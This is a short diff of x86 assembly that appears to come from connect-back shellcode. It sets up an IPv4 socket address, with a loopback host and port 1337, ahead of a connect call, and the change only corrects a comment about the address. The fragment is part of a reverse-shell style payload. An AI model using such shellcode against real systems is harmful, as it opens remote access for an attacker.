@@ -23,7 +23,7 @@ _start:
   ; connect ipv4
   ;; v4rhost struct
   inc ebx           ; 0x1 becomes 0x2 (PF_INET_
-  push 0x0101017F   ; v4rhost.sin_addr.s_addr = 127.0.0.1
+  push 0x0101017F   ; v4rhost.sin_addr.s_addr = 127.1.1.1
   push word 0x3905  ; v4rhost.sin_port = htons(1337)
   push bx           ; v4rhost.sin_family = 0x2 (AF_INET)
   ;; arguments
